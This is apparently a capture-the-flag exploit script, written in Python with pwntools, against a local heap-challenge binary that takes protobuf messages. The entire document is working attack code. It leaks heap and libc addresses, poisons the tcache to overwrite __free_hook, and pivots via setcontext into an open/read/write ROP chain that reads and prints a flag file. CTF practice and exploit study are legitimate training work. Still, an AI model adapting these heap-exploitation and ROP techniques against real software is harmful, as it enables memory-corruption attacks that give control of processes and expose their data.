from pwn import *
from ctf_pb2 import *

p = process('./pwn')
elf = ELF('./pwn')
lib = elf.libc


def send_payload(actionid, msgidx, msgsize, msgcontent):
    d = Chunk()
    d.actionid = actionid * 2
    d.msgidx = msgidx * 2
    d.msgsize = msgsize
    d.msgcontent = msgcontent
    strs = d.SerializeToString()
    p.recvuntil(b'You can try to have friendly communication with me now:')
    p.send(strs)


def add(id_, size_, mess):
    send_payload(1, id_, size_, mess)


def edit(id_, size_, mess):
    send_payload(2, id_, size_, mess)


def show(id_):
    send_payload(3, id_, 0x10, b'a')


def delete(id_):
    send_payload(4, id_, 0x10, b'a')


[add(i, 0xd0, b'a' * 0xd0) for i in range(0x1, 0xa)]
[delete(i) for i in range(0x1, 0x9)]
show(0x8)
p.recvuntil(b'\n')
p.recv(56)
heap_addr = u64(p.recv(8))
print(hex(heap_addr))
p.recv(24)
base_addr = u64(p.recv(8)) - 0x1ebbe0
flag_addr = heap_addr - 0x470
print(hex(base_addr))
free_hook = base_addr + lib.sym["__free_hook"]
print(hex(free_hook))
setcontext_addr = base_addr + lib.sym["setcontext"]
open_addr = base_addr + lib.sym["open"]
read_addr = base_addr + lib.sym["read"]
write_addr = base_addr + lib.sym["write"]
pop_rdi = base_addr + 0x0000000000026b72
pop_rsi = base_addr + 0x0000000000027529
pop_rdx_rbx = base_addr + 0x00000000001626d6
magic_gadget = base_addr + 0x00000000001547a0

edit(0x5, 0x8, p64(free_hook))

payload = b'./flag\00\00' + p64(flag_addr) + p64(0) * 2 + p64(setcontext_addr + 61)
payload += b'a' * (0xa0 - 0x28) + p64(heap_addr + 0x710) + p64(pop_rdi + 1) + b'a' * 0x20
add(0xa, 0xd0, payload)
add(0xb, 0xd0, p64(magic_gadget) + p64(0) * 25)

payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx_rbx) + p64(0x100) + p64(0) + p64(read_addr)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx_rbx) + p64(0x100) + p64(0) + p64(write_addr)

add(0xc, 0xd0, payload)

delete(0xa)

p.interactive()
